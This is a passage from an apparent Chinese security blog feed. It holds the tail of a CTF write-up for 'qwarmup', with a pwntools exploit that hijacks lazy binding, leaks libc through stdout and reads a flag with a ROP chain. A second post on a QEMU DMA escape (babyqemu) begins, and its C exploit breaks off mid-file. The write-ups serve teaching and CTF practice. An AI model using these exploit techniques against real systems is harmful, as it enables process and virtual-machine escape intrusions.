<a class="sourceLine" id="cb26-27" title="27">        p.send(p64(offset <span class="op">+</span> i, signed<span class="op">=</span><span class="va">True</span>))</a>
<a class="sourceLine" id="cb26-28" title="28">        <span class="cf">if</span>(<span class="bu">type</span>(byte) <span class="op">==</span> <span class="bu">type</span>(<span class="bn">0x1</span>)):</a>
<a class="sourceLine" id="cb26-29" title="29">            p.send(p8(byte))</a>
<a class="sourceLine" id="cb26-30" title="30">        <span class="cf">else</span>:</a>
<a class="sourceLine" id="cb26-31" title="31">            p.send(byte)</a>
<a class="sourceLine" id="cb26-32" title="32">        p.recvuntil(<span class="st">&quot;Success!&quot;</span>)</a>
<a class="sourceLine" id="cb26-33" title="33"></a>
<a class="sourceLine" id="cb26-34" title="34"><span class="kw">def</span> write_nosuccess(offset, data):</a>
<a class="sourceLine" id="cb26-35" title="35">    <span class="cf">for</span> i, byte <span class="kw">in</span> <span class="bu">enumerate</span>(data):</a>
<a class="sourceLine" id="cb26-36" title="36">        p.send(p64(offset <span class="op">+</span> i, signed<span class="op">=</span><span class="va">True</span>))</a>
<a class="sourceLine" id="cb26-37" title="37">        <span class="cf">if</span>(<span class="bu">type</span>(byte) <span class="op">==</span> <span class="bu">type</span>(<span class="bn">0x1</span>)):</a>
<a class="sourceLine" id="cb26-38" title="38">            p.send(p8(byte))</a>
<a class="sourceLine" id="cb26-39" title="39">        <span class="cf">else</span>:</a>
<a class="sourceLine" id="cb26-40" title="40">            p.send(byte)</a>
<a class="sourceLine" id="cb26-41" title="41"></a>
<a class="sourceLine" id="cb26-42" title="42"><span class="kw">class</span> link_map:</a>
<a class="sourceLine" id="cb26-43" title="43">    DT_JMPREL <span class="op">=</span> <span class="dv">23</span></a>
<a class="sourceLine" id="cb26-44" title="44">    DT_SYMTAB <span class="op">=</span> <span class="dv">6</span></a>
<a class="sourceLine" id="cb26-45" title="45">    DT_STRTAB <span class="op">=</span> <span class="dv">5</span></a>
<a class="sourceLine" id="cb26-46" title="46">    DT_VER <span class="op">=</span> <span class="dv">50</span></a>
<a class="sourceLine" id="cb26-47" title="47">    DT_FINI <span class="op">=</span> <span class="dv">13</span></a>
<a class="sourceLine" id="cb26-48" title="48">    DT_PLTGOT <span class="op">=</span> <span class="dv">3</span></a>
<a class="sourceLine" id="cb26-49" title="49">    DT_FINI_ARRAY <span class="op">=</span> <span class="dv">26</span></a>
<a class="sourceLine" id="cb26-50" title="50">    DT_FINI_ARRAYSZ <span class="op">=</span> <span class="dv">28</span></a>
<a class="sourceLine" id="cb26-51" title="51">    DT_DEBUG <span class="op">=</span> <span class="dv">21</span></a>
<a class="sourceLine" id="cb26-52" title="52"></a>
<a class="sourceLine" id="cb26-53" title="53">    <span class="kw">def</span> <span class="fu">__init__</span>(<span class="va">self</span>, offset):</a>
<a class="sourceLine" id="cb26-54" title="54">        <span class="va">self</span>.offset <span class="op">=</span> offset</a>
<a class="sourceLine" id="cb26-55" title="55"></a>
<a class="sourceLine" id="cb26-56" title="56">    <span class="kw">def</span> l_addr(<span class="va">self</span>):</a>
<a class="sourceLine" id="cb26-57" title="57">        <span class="cf">return</span> ld.address <span class="op">+</span> <span class="va">self</span>.offset</a>
<a class="sourceLine" id="cb26-58" title="58"></a>
<a class="sourceLine" id="cb26-59" title="59">    <span class="kw">def</span> l_info(<span class="va">self</span>, tag):</a>
<a class="sourceLine" id="cb26-60" title="60">        <span class="cf">return</span> ld.address <span class="op">+</span> <span class="va">self</span>.offset <span class="op">+</span> <span class="bn">0x40</span> <span class="op">+</span> tag <span class="op">*</span> <span class="dv">8</span></a>
<a class="sourceLine" id="cb26-61" title="61"></a>
<a class="sourceLine" id="cb26-62" title="62">ld.address <span class="op">=</span> <span class="bn">0x32f000</span> <span class="op">-</span> <span class="bn">0x10</span></a>
<a class="sourceLine" id="cb26-63" title="63">libc.address <span class="op">=</span> <span class="bn">0xf4000</span> <span class="op">-</span> <span class="bn">0x10</span></a>
<a class="sourceLine" id="cb26-64" title="64">binary_map <span class="op">=</span> link_map(<span class="bn">0x3b2e0</span>)</a>
<a class="sourceLine" id="cb26-65" title="65"></a>
<a class="sourceLine" id="cb26-66" title="66"><span class="co"># debug(p,&quot;b *$rebase({})&quot;.format(0x14D1))</span></a>
<a class="sourceLine" id="cb26-67" title="67"><span class="co"># debug(p,&quot;b write&quot;)</span></a>
<a class="sourceLine" id="cb26-68" title="68">p.send(p32(<span class="bn">0xF0000</span>))</a>
<a class="sourceLine" id="cb26-69" title="69"></a>
<a class="sourceLine" id="cb26-70" title="70"><span class="co"># =============[ loop ]=========================</span></a>
<a class="sourceLine" id="cb26-71" title="71"><span class="co"># write_real_addr ==&gt; write@got + 0x70</span></a>
<a class="sourceLine" id="cb26-72" title="72"><span class="co"># set size=0xF0000 ==&gt; size = 0x0XXXX</span></a>
<a class="sourceLine" id="cb26-73" title="73"><span class="co"># Strat Loop</span></a>
<a class="sourceLine" id="cb26-74" title="74"><span class="co"># write@got != real_addr ==&gt; call write AWAYLS lazy Binding </span></a>
<a class="sourceLine" id="cb26-75" title="75">logger(<span class="st">&quot;binary_map.l_addr()&quot;</span>,binary_map.l_addr())</a>
<a class="sourceLine" id="cb26-76" title="76">write(binary_map.l_addr(),<span class="st">&quot;</span><span class="ch">\x70</span><span class="st">&quot;</span>)</a>
<a class="sourceLine" id="cb26-77" title="77"></a>
<a class="sourceLine" id="cb26-78" title="78"><span class="co"># =============[ edit stdout ]==================</span></a>
<a class="sourceLine" id="cb26-79" title="79">write(libc.symbols[<span class="st">&#39;_IO_2_1_stdout_&#39;</span>],p32(<span class="bn">0xfbad1800</span>))</a>
<a class="sourceLine" id="cb26-80" title="80">write(libc.symbols[<span class="st">&#39;_IO_2_1_stdout_&#39;</span>]<span class="op">+</span><span class="bn">0x28</span>,p8(<span class="bn">0xff</span>))</a>
<a class="sourceLine" id="cb26-81" title="81"></a>
<a class="sourceLine" id="cb26-82" title="82"><span class="co"># ====[r_dubug.write ==&gt; &quot;_IO_flush_all&quot;]=======</span></a>
<a class="sourceLine" id="cb26-83" title="83">write(ld.symbols[<span class="st">&#39;_r_debug&#39;</span>]<span class="op">+</span><span class="bn">0x22</span>,<span class="st">&quot;_IO_flush_all</span><span class="ch">\x00</span><span class="st">&quot;</span>)</a>
<a class="sourceLine" id="cb26-84" title="84"></a>
<a class="sourceLine" id="cb26-85" title="85"><span class="co"># =============[.strtab ==&gt; r_dubug]============</span></a>
<a class="sourceLine" id="cb26-86" title="86"><span class="co"># =============[call _IO_flush_all]=============</span></a>
<a class="sourceLine" id="cb26-87" title="87">logger(<span class="st">&quot;binary_map.l_info(DT_STRTAB)&quot;</span>,binary_map.l_info(binary_map.DT_STRTAB))</a>
<a class="sourceLine" id="cb26-88" title="88">write_nosuccess(binary_map.l_info(binary_map.DT_STRTAB),<span class="st">&quot;</span><span class="ch">\xb8</span><span class="st">&quot;</span>)</a>
<a class="sourceLine" id="cb26-89" title="89"><span class="co"># call _IO_flush_all</span></a>
<a class="sourceLine" id="cb26-90" title="90"><span class="co"># leak libc</span></a>
<a class="sourceLine" id="cb26-91" title="91">p.recv(<span class="dv">5</span>)</a>
<a class="sourceLine" id="cb26-92" title="92">libc_base <span class="op">=</span> u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,b<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">-</span><span class="bn">0x21ba70</span></a>
<a class="sourceLine" id="cb26-93" title="93">logger(<span class="st">&quot;libc_base&quot;</span>,libc_base)</a>
<a class="sourceLine" id="cb26-94" title="94"></a>
<a class="sourceLine" id="cb26-95" title="95"><span class="co"># ================[fix write]===================</span></a>
<a class="sourceLine" id="cb26-96" title="96">write(binary_map.l_info(binary_map.DT_STRTAB),<span class="st">&quot;</span><span class="ch">\x78</span><span class="st">&quot;</span>)</a>
<a class="sourceLine" id="cb26-97" title="97"></a>
<a class="sourceLine" id="cb26-98" title="98"></a>
<a class="sourceLine" id="cb26-99" title="99"><span class="co"># ===============[house of cat]=================</span></a>
<a class="sourceLine" id="cb26-100" title="100">setcontext <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x53a30</span><span class="op">+</span><span class="dv">61</span></a>
<a class="sourceLine" id="cb26-101" title="101">syscall <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x0000000000091396</span></a>
<a class="sourceLine" id="cb26-102" title="102">pop_rax <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x0000000000045eb0</span></a>
<a class="sourceLine" id="cb26-103" title="103">pop_rdi <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x000000000002a3e5</span></a>
<a class="sourceLine" id="cb26-104" title="104">pop_rsi <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x000000000002be51</span></a>
<a class="sourceLine" id="cb26-105" title="105">pop_rdx_rbx <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x0000000000090529</span></a>
<a class="sourceLine" id="cb26-106" title="106">_IO_wfile_jumps <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x2160c0</span></a>
<a class="sourceLine" id="cb26-107" title="107">heap <span class="op">=</span> libc_base<span class="bn">-0xf3ff0</span></a>
<a class="sourceLine" id="cb26-108" title="108">stderr <span class="op">=</span> libc_base<span class="op">+</span><span class="bn">0x21a6a0</span></a>
<a class="sourceLine" id="cb26-109" title="109"></a>
<a class="sourceLine" id="cb26-110" title="110">write(libc.symbols[<span class="st">&#39;_IO_2_1_stderr_&#39;</span>]<span class="op">+</span><span class="bn">0x28</span>,p64(<span class="bn">0xffffffffffffffff</span>))</a>
<a class="sourceLine" id="cb26-111" title="111">write(libc.symbols[<span class="st">&#39;_IO_2_1_stderr_&#39;</span>]<span class="op">+</span><span class="bn">0x40</span>,p64(<span class="dv">1</span>))</a>
<a class="sourceLine" id="cb26-112" title="112">write(libc.symbols[<span class="st">&#39;_IO_2_1_stderr_&#39;</span>]<span class="op">+</span><span class="bn">0x50</span>,p64(heap)<span class="op">+</span>p64(setcontext))<span class="co"># rdx</span></a>
<a class="sourceLine" id="cb26-113" title="113">write(libc.symbols[<span class="st">&#39;_IO_2_1_stderr_&#39;</span>]<span class="op">+</span><span class="bn">0xa0</span>,p64(stderr<span class="op">+</span><span class="bn">0x30</span>))</a>
<a class="sourceLine" id="cb26-114" title="114">write(libc.symbols[<span class="st">&#39;_IO_2_1_stderr_&#39;</span>]<span class="op">+</span><span class="bn">0xd8</span>,p64(_IO_wfile_jumps<span class="op">+</span><span class="bn">0x30</span>))</a>
<a class="sourceLine" id="cb26-115" title="115">write(libc.symbols[<span class="st">&#39;_IO_2_1_stderr_&#39;</span>]<span class="op">+</span><span class="bn">0xd8</span><span class="op">+</span><span class="bn">0x38</span>,p64(stderr<span class="op">+</span><span class="bn">0x40</span>))</a>
<a class="sourceLine" id="cb26-116" title="116"></a>
<a class="sourceLine" id="cb26-117" title="117">rop <span class="op">=</span> p64(heap)<span class="op">+</span>p64(pop_rsi)<span class="op">+</span>p64(<span class="dv">0</span>)<span class="op">+</span>p64(pop_rax)<span class="op">+</span>p64(<span class="dv">2</span>)<span class="op">+</span>p64(syscall) <span class="co">#open</span></a>
<a class="sourceLine" id="cb26-118" title="118">rop <span class="op">+=</span> p64(pop_rdi)<span class="op">+</span>p64(<span class="dv">3</span>)<span class="op">+</span>p64(pop_rsi)<span class="op">+</span>p64(heap<span class="op">+</span><span class="bn">0x400</span>)</a>
<a class="sourceLine" id="cb26-119" title="119">rop <span class="op">+=</span> p64(pop_rdx_rbx)<span class="op">+</span>p64(<span class="bn">0x30</span>)<span class="op">*</span><span class="dv">2</span><span class="op">+</span>p64(pop_rax)<span class="op">+</span>p64(<span class="dv">0</span>)<span class="op">+</span>p64(syscall) <span class="co">#read</span></a>
<a class="sourceLine" id="cb26-120" title="120">rop <span class="op">+=</span> p64(pop_rdi)<span class="op">+</span>p64(<span class="dv">1</span>)<span class="op">+</span>p64(pop_rax)<span class="op">+</span>p64(<span class="dv">1</span>)<span class="op">+</span>p64(syscall)          <span class="co">#write</span></a>
<a class="sourceLine" id="cb26-121" title="121"></a>
<a class="sourceLine" id="cb26-122" title="122"></a>
<a class="sourceLine" id="cb26-123" title="123">payload <span class="op">=</span> b<span class="st">&quot;flag&quot;</span>.ljust(<span class="bn">0xa0</span>,b<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>)<span class="op">+</span>p64(heap<span class="op">+</span><span class="bn">0x100</span>)<span class="op">+</span>p64(pop_rdi)</a>
<a class="sourceLine" id="cb26-124" title="124">payload <span class="op">=</span> payload.ljust(<span class="bn">0x100</span>,b<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>)</a>
<a class="sourceLine" id="cb26-125" title="125">payload <span class="op">+=</span> rop</a>
<a class="sourceLine" id="cb26-126" title="126">write(<span class="dv">0</span>,payload)</a>
<a class="sourceLine" id="cb26-127" title="127"></a>
<a class="sourceLine" id="cb26-128" title="128"><span class="co"># debug(p,&quot;b *{}&quot;.format(setcontext))</span></a>
<a class="sourceLine" id="cb26-129" title="129"><span class="co"># pause()</span></a>
<a class="sourceLine" id="cb26-130" title="130"></a>
<a class="sourceLine" id="cb26-131" title="131"><span class="co"># =============[call _IO_flush_all]==============</span></a>
<a class="sourceLine" id="cb26-132" title="132">write_nosuccess(binary_map.l_info(binary_map.DT_STRTAB),<span class="st">&quot;</span><span class="ch">\xb8</span><span class="st">&quot;</span>)</a>
<a class="sourceLine" id="cb26-133" title="133"></a>
<a class="sourceLine" id="cb26-134" title="134"><span class="co"># debug(p)</span></a>
<a class="sourceLine" id="cb26-135" title="135">p.interactive()</a></code></pre></div>
<h2 id="x03-总结">0x03 总结</h2>
<p>qwarmup只是相对简单的<code>dl_fixup</code>利用，虽然只有1字节写，但是从1字节写到无限字节写是一种常规的利用思路，同时，由于启用了<code>puts</code>等函数，打<code>IO_file</code>结构体泄露<code>libc</code>的真实地址使得这题难度再次下降。</p>
<p>但是这道题就引入了一种很好的思路，对延迟绑定的利用不一定非要局限于<code>ret2dl</code>的模板化利用，将视野放到整个延迟绑定的过程，它涉及多个结构体和各种指针，对其的劫持和利用是一类很好的思路。</p>
<p>当然，如果这题没有使用<code>puts</code>等函数，那该如何泄露<code>libc</code>？或者说，可不可以在不泄露libc的情况下执行ROP。</p>
<p>这里以国外比赛<code>writeup</code>为例，具体不在详述：</p>
<ul>
<li><strong>DiceCTF2022 nightmare</strong> ： <a href="https://blog.pepsipu.com/posts/nightmare">the pepsi place | Nightmare: Novel Exploitation Tactics With One Byte Write. (pepsipu.com)</a></li>
<li><strong>secconCTF2022 simplemod</strong>：<a href="https://org.anize.rs/SECCON-2022/pwn/simplemod.html">simplemod | Organisers (anize.rs)</a></li>
</ul>
<p>## 0xFF 参考连接</p>
<p><a href="https://docs.oracle.com/cd/E56344_01/html/E54069/chapter6-42444.html">动态节 - Oracle® Solaris 11.2 链接程序和库指南</a></p>
<p><a href="https://github.com/dicegang/dicectf-2022-challenges/tree/master/pwn/nightmare">dicectf-2022-challenges/pwn/nightmare at master · dicegang/dicectf-2022-challenges · GitHub</a></p>
<p><a href="https://gist.github.com/shift-crops/ff8c9f60660e2e7ab0e8c9f615c63176">SECCON CTF 2022 babyfile/simplemod (github.com)</a></p>
<p><a href="https://codebrowser.dev/glibc/glibc/elf/dl-runtime.c.html#_dl_fixup">dl-runtime.c source code - Codebrowser</a></p>
<p><a href="https://kagehutatsu.com/?p=723">2022 强网杯 Pwn 部分Writeup-Pwn影二つ的博客 (kagehutatsu.com)</a></p>
<p><a href="https://blog.csdn.net/conansonic/article/details/54634142">_dl_runtime_resolve源码分析_二侠的博客-CSDN博客</a></p>
<p><a href="https://ctf-wiki.org/executable/elf/structure/data-related-sections/">Data Related Sections - CTF Wiki (ctf-wiki.org)</a></p>
<p><a href="https://bbs.pediy.com/thread-258597.htm#msg_header_h1_2">深入窥探动态链接-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p>]]></description>
    <pubDate>Wed, 23 Nov 2022 15:32:04 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[QEMU逃逸  --  dma]]></title>
    <link>https://blog.mark0519.com/#//#/pwnable/221113-qemu-dma</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/pwnable/221113-qemu-dma</guid>
    <description><![CDATA[<h1 id="qemu逃逸-dma">QEMU逃逸 – dma</h1>
<blockquote>
<p><code>DMA(Direct Memory Access)</code>：直接内存访问</p>
</blockquote>
<h2 id="x00-dma">0x00 DMA</h2>
<p><code>DMA(Direct Memory Access)</code>：直接内存访问</p>
<p>有两种方式引发数据传输：</p>
<p>第一种情况：软件对数据的请求</p>
<ul>
<li><p>当进程调用<code>read</code>，驱动程序函数分配一个<code>DMA</code>缓冲区，并让硬件将数据传输到这个缓冲区中，进程处于睡眠状态；</p></li>
<li><p>硬件将数据写入到<code>DMA</code>缓冲区中，当写入完毕，产生一个中断</p></li>
<li><p>中断处理程序获取输入的数据，应答中断，并唤起进程，该进程现在即可读取数据</p>
<p>第二种情况：在异步使用<code>DMA</code>时</p></li>
<li><p>硬件产生中断，宣告新数据的到来</p></li>
<li><p>中断处理程序分配一个缓冲区，并且告诉硬件向哪里传输数据</p></li>
<li><p>外围设备将数据写入数据区，完成后，产生另外一个中断</p></li>
<li><p>处理程序分发数据，唤醒任何相关进程，然后执行清理工作</p></li>
</ul>
<p>DMA控制器必须有以下功能：</p>
<p>1、 能向CPU发出系统保持(HOLD)信号，提出总线接管请求；</p>
<p>2、 当CPU发出允许接管信号后，负责对总线的控制，进入DMA方式；</p>
<p>3、 能对存储器寻址及能修改地址指针，实现对内存的读写操作；</p>
<p>4、 能决定本次DMA传送的字节数，判断DMA传送是否结束；</p>
<p>5、 发出DMA结束信号，使CPU恢复正常工作状态。</p>
<p><strong>注意：</strong>当虚拟机通过<code>DMA（Direct Memory Access）</code>访问大块<code>I/O</code>时，<code>QEMU</code>模拟程序将不会把结果放进共享页中，而是通过内存映射的方式将结果直接写到虚拟机的内存中，然后通知<code>KVM</code>模块告诉客户机<code>DMA</code>操作已经完成。</p>
<h2 id="x01-hitb-gsec2017-babyqemu">0x01 HITB GSEC2017 babyqemu</h2>
<p>DMA存在越界读和越界写</p>
<blockquote>
<p>本质上是完全没有检查dma.cnt的数字</p>
</blockquote>
<p>泄露qemu_elf_base，寻找system的plt表地址，填入“cat flag”字符串</p>
<h2 id="x02-exploit">0x02 exploit</h2>
<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb1-1" title="1"><span class="pp">#include</span><span class="im">&lt;stdint.h&gt;</span></a>
<a class="sourceLine" id="cb1-2" title="2"><span class="pp">#include</span><span class="im">&lt;fcntl.h&gt;</span></a>
<a class="sourceLine" id="cb1-3" title="3"><span class="pp">#include</span><span class="im">&lt;sys/mman.h&gt;</span></a>
<a class="sourceLine" id="cb1-4" title="4"><span class="pp">#include</span><span class="im">&lt;sys/io.h&gt;</span></a>
<a class="sourceLine" id="cb1-5" title="5"><span class="pp">#include</span><span class="im">&lt;stdio.h&gt;</span></a>
<a class="sourceLine" id="cb1-6" title="6"><span class="pp">#include</span><span class="im">&lt;unistd.h&gt;</span></a>
<a class="sourceLine" id="cb1-7" title="7"></a>
<a class="sourceLine" id="cb1-8" title="8"><span class="dt">unsigned</span> <span class="dt">char</span>* mmio_mem;</a>
<a class="sourceLine" id="cb1-9" title="9"><span class="dt">uint64_t</span> phy_userbuf;</a>
<a class="sourceLine" id="cb1-10" title="10"><span class="dt">char</span> *userbuf;</a>
<a class="sourceLine" id="cb1-11" title="11"></a>
<a class="sourceLine" id="cb1-12" title="12"><span class="dt">void</span> Err(<span class="dt">char</span> * err){</a>
<a class="sourceLine" id="cb1-13" title="13">    printf(<span class="st">&quot;[*] Error: %s</span><span class="sc">\n</span><span class="st">&quot;</span>,err);</a>
<a class="sourceLine" id="cb1-14" title="14">    exit(-<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb1-15" title="15">}</a>
<a class="sourceLine" id="cb1-16" title="16"></a>
<a class="sourceLine" id="cb1-17" title="17"><span class="dt">void</span> init_mmio(){</a>
<a class="sourceLine" id="cb1-18" title="18">    <span class="dt">int</span> mmio_fd = open(<span class="st">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>,O_RDWR|O_SYNC);</a>
<a class="sourceLine" id="cb1-19" title="19">    mmio_mem = mmap(<span class="dv">0</span>,<span class="bn">0x1000</span>,PROT_READ|PROT_WRITE,MAP_SHARED,mmio_fd,<span class="dv">0</span>);</a>
<a class="sourceLine" id="cb1-20" title="20">}</a>
<a class="sourceLine" id="cb1-21" title="21"></a>
<a class="sourceLine" id="cb1-22" title="22"><span class="dt">void</span> mmio_write(<span class="dt">uint32_t</span> addr,<span class="dt">uint32_t</span> value){</a>
<a class="sourceLine" id="cb1-23" title="23">    *(<span class="dt">uint32_t</span>*)(mmio_mem+addr) = value;</a>
<a class="sourceLine" id="cb1-24" title="24">}</a>
<a class="sourceLine" id="cb1-25" title="25"></a>
<a class="sourceLine" id="cb1-26" title="26"><span class="dt">uint64_t</span> mmio_read(<span class="dt">uint64_t</span> addr){</a>
<a class="sourceLine" id="cb1-27" title="27">    <span class="cf">return</span> *(<span class="dt">uint64_t</span>*)(mmio_mem+addr); </a>
<a class="sourceLine" id="cb1-28" title="28">}</a>
<a class="sourceLine" id="cb1-29" title="29"></a>
<a class="sourceLine" id="cb1-30" title="30"><span class="dt">size_t</span> va2pa(<span class="dt">void</span> *addr){</a>
<a class="sourceLine" id="cb1-31" title="31">    <span class="dt">uint64_t</span> data;</a>
<a class="sourceLine" id="cb1-32" title="32"></a>
<a class="sourceLine" id="cb1-33" title="33">    <span class="dt">int</span> fd = open(<span class="st">&quot;/proc/self/pagemap&quot;</span>,O_RDONLY);</a>
<a class="sourceLine" id="cb1-34" title="34">    <span class="cf">if</span>(!fd){</a>
<a class="sourceLine" id="cb1-35" title="35">        perror(<span class="st">&quot;open pagemap&quot;</span>);</a>
<a class="sourceLine" id="cb1-36" title="36">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb1-37" title="37">    }</a>
<a class="sourceLine" id="cb1-38" title="38"></a>
<a class="sourceLine" id="cb1-39" title="39">    <span class="dt">size_t</span> pagesize = getpagesize();</a>
<a class="sourceLine" id="cb1-40" title="40">    <span class="dt">size_t</span> offset = ((<span class="dt">uintptr_t</span>)addr / pagesize) * <span class="kw">sizeof</span>(<span class="dt">uint64_t</span>);</a>
<a class="sourceLine" id="cb1-41" title="41"></a>
<a class="sourceLine" id="cb1-42" title="42">    <span class="cf">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="dv">0</span>){</a>
<a class="sourceLine" id="cb1-43" title="43">        puts(<span class="st">&quot;lseek&quot;</span>);</a>
<a class="sourceLine" id="cb1-44" title="44">        close(fd);</a>
<a class="sourceLine" id="cb1-45" title="45">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb1-46" title="46">    }</a>
<a class="sourceLine" id="cb1-47" title="47"></a>
<a class="sourceLine" id="cb1-48" title="48">    <span class="cf">if</span>(read(fd,&amp;data,<span class="dv">8</span>) != <span class="dv">8</span>){</a>
<a class="sourceLine" id="cb1-49" title="49">        puts(<span class="st">&quot;read&quot;</span>);</a>
<a class="sourceLine" id="cb1-50" title="50">        close(fd);</a>
<a class="sourceLine" id="cb1-51" title="51">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb1-52" title="52">    }</a>
<a class="sourceLine" id="cb1-53" title="53"></a>
<a class="sourceLine" id="cb1-54" title="54">    <span class="cf">if</span>(!(data &amp; (((<span class="dt">uint64_t</span>)<span class="dv">1</span> &lt;&lt; <span class="dv">63</span>)))){</a>
<a class="sourceLine" id="cb1-55" title="55">        puts(<span class="st">&quot;page&quot;</span>);</a>
<a class="sourceLine" id="cb1-56" title="56">        close(fd);</a>
<a class="sourceLine" id="cb1-57" title="57">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb1-58" title="58">    }</a>
<a class="sourceLine" id="cb1-59" title="59"></a>
<a class="sourceLine" id="cb1-60" title="60">    <span class="dt">size_t</span> pageframenum = data &amp; ((<span class="dv">1</span><span class="bu">ull</span> &lt;&lt; <span class="dv">55</span>) - <span class="dv">1</span>);</a>
<a class="sourceLine" id="cb1-61" title="61">    <span class="dt">size_t</span> phyaddr = pageframenum * pagesize + (<span class="dt">uintptr_t</span>)addr % pagesize;</a>
<a class="sourceLine" id="cb1-62" title="62"></a>
<a class="sourceLine" id="cb1-63" title="63">    close(fd);</a>
<a class="sourceLine" id="cb1-64" title="64"></a>
<a class="sourceLine" id="cb1-65" title="65">    <span class="cf">return</span> phyaddr;</a>
<a class="sourceLine" id="cb1-66" title="66">}</a>
<a class="sourceLine" id="cb1-67" title="67"></a>
<a class="sourceLine" id="cb1-68" title="68"><span class="dt">uint64_t</span> dma_get_src(){</a>
<a class="sourceLine" id="cb1-69" title="69">    <span class="cf">return</span> mmio_read(<span class="bn">0x80</span>);</a>
<a class="sourceLine" id="cb1-70" title="70">}</a>
<a class="sourceLine" id="cb1-71" title="71"></a>
<a class="sourceLine" id="cb1-72" title="72"><span class="dt">uint64_t</span> dma_get_dst(){</a>
<a class="sourceLine" id="cb1-73" title="73">    <span class="cf">return</span> mmio_read(<span class="bn">0x88</span>);</a>
<a class="sourceLine" id="cb1-74" title="74">}</a>
<a class="sourceLine" id="cb1-75" title="75"></a>
<a class="sourceLine" id="cb1-76" title="76"><span class="dt">uint64_t</span> dma_get_cnt(){</a>
<a class="sourceLine" id="cb1-77" title="77">    <span class="cf">return</span> mmio_read(<span class="bn">0x90</span>);</a>
<a class="sourceLine" id="cb1-78" title="78">}</a>
<a class="sourceLine" id="cb1-79" title="79"></a>
<a class="sourceLine" id="cb1-80" title="80"><span class="dt">uint64_t</span> dma_get_cmd(){</a>
<a class="sourceLine" id="cb1-81" title="81">    <span class="cf">return</span> mmio_read(<span class="bn">0x98</span>);</a>
<a class="sourceLine" id="cb1-82" title="82">}</a>
<a class="sourceLine" id="cb1-83" title="83"></a>
<a class="sourceLine" id="cb1-84" title="84"><span class="dt">void</span> dma_set_src(<span class="dt">uint32_t</span> value){</a>
<a class="sourceLine" id="cb1-85" title="85">    mmio_write(<span class="bn">0x80</span>,value);</a>
<a class="sourceLine" id="cb1-86" title="86">}</a>
<a class="sourceLine" id="cb1-87" title="87"></a>
<a class="sourceLine" id="cb1-88" title="88"><span class="dt">void</span> dma_set_dst(<span class="dt">uint32_t</span> value){</a>
<a class="sourceLine" id="cb1-89" title="89">    mmio_write(<span class="bn">0x88</span>,value);</a>
<a class="sourceLine" id="cb1-90" title="90">}</a>
<a class="sourceLine" id="cb1-91" title="91"></a>
<a class="sourceLine" id="cb1-92" title="92"><span class="dt">void</span> dma_set_cnt(<span class="dt">uint32_t</span> value){</a>
<a class="sourceLine" id="cb1-93" title="93">    mmio_write(<span class="bn">0x90</span>,value);</a>
<a class="sourceLine" id="cb1-94" title="94">}</a>
<a class="sourceLine" id="cb1-95" title="95"></a>
<a class="sourceLine" id="cb1-96" title="96"><span class="dt">void</span> dma_set_cmd(<span class="dt">uint32_t</span> value){ <span class="co">// timer</span></a>
<a class="sourceLine" id="cb1-97" title="97">    mmio_write(<span class="bn">0x98</span>,value);</a>
<a class="sourceLine" id="cb1-98" title="98">}</a>
<a class="sourceLine" id="cb1-99" title="99"></a>
<a class="sourceLine" id="cb1-100" title="100"><span class="dt">void</span> dma_do_write(<span class="dt">uint32_t</span> addr, <span class="dt">void</span>* buf, <span class="dt">size_t</span> len){</a>
<a class="sourceLine" id="cb1-101" title="101">    memcpy(userbuf, buf, len);</a>
<a class="sourceLine" id="cb1-102" title="102"></a>
<a class="sourceLine" id="cb1-103" title="103">    dma_set_src(phy_userbuf);</a>
<a class="sourceLine" id="cb1-104" title="104">    dma_set_dst(addr);</a>
<a class="sourceLine" id="cb1-105" title="105">    dma_set_cnt(len);</a>
<a class="sourceLine" id="cb1-106" title="106"></a>
<a class="sourceLine" id="cb1-107" title="107">    dma_set_cmd(<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb1-108" title="108">    sleep(<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb1-109" title="109">}</a>
<a class="sourceLine" id="cb1-110" title="110"></a>
<a class="sourceLine" id="cb1-111" title="111"><span class="dt">void</span> dma_do_enc(<span class="dt">uint32_t</span> addr, <span class="dt">size_t</span> len){</a>
<a class="sourceLine" id="cb1-112" title="112">    dma_set_src(addr);</a>
<a class="sourceLine" id="cb1-113" title="113">    dma_set_cnt(len);</a>
<a class="sourceLine" id="cb1-114" title="114"></a>
<a class="sourceLine" id="cb1-115" title="115">    dma_set_cmd(<span class="dv">7</span>);</a>
<a class="sourceLine" id="cb1-116" title="116">}</a>
<a class="sourceLine" id="cb1-117" title="117"></a>
<a class="sourceLine" id="cb1-118" title="118"></a>
<a class="sourceLine" id="cb1-119" title="119"><span class="dt">int</span> main(){</a>
<a class="sourceLine" id="cb1-120" title="120">    init_mmio();</a>
<a class="sourceLine" id="cb1-121" title="121">    puts(<span class="st">&quot;[*] init mmio&quot;</span>);</a>
<a class="sourceLine" id="cb1-122" title="122">    printf(<span class="st">&quot;[*] mmio_mem ==&gt; 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>,mmio_mem);</a>
<a class="sourceLine" id="cb1-123" title="123"></a>
